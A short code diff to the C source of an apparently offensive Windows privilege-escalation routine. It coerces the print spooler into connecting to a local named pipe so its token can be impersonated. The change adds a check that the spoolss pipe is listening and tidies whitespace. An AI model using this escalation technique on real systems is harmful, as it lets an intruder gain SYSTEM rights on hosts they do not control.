@@ -32,6 +32,10 @@ DWORD elevate_via_namedpipe_printspooler(Remote* remote, Packet* packet)
 	PRIV_POST_IMPERSONATION PostImpersonation;
 
 	do {
+		if (!does_pipe_exist(L"\\\\.\\pipe\\spoolss")) {
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler: \\pipe\\spoolss is not listening.");
+		}
+
 		hNtdll = GetModuleHandleA("ntdll");
 		if (hNtdll == NULL) {
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler: Failed to resolve RtlGetVersion");
@@ -150,7 +154,7 @@ DWORD WINAPI trigger_printer_connection(LPWSTR pPipeName)
 		{
 			BREAK_ON_ERROR("[ELEVATE] Out of Memory");
 		}
-		
+
 		_snwprintf_s(pPrinterName, MAX_PATH, _TRUNCATE, (LPWSTR)(L"\\\\%s"), pComputerName);
 		_snwprintf_s(pCaptureServer, MAX_PATH, _TRUNCATE, (LPWSTR)(L"\\\\localhost/pipe/%s"), pPipeName);
 
@@ -165,7 +169,7 @@ DWORD WINAPI trigger_printer_connection(LPWSTR pPipeName)
 		RpcExcept(EXCEPTION_EXECUTE_HANDLER);
 		{
 			BREAK_WITH_ERROR("[ELEVATE] Out of Memory", RpcExceptionCode());
-		} 
+		}
 		RpcEndExcept;
 
 	} while (0);
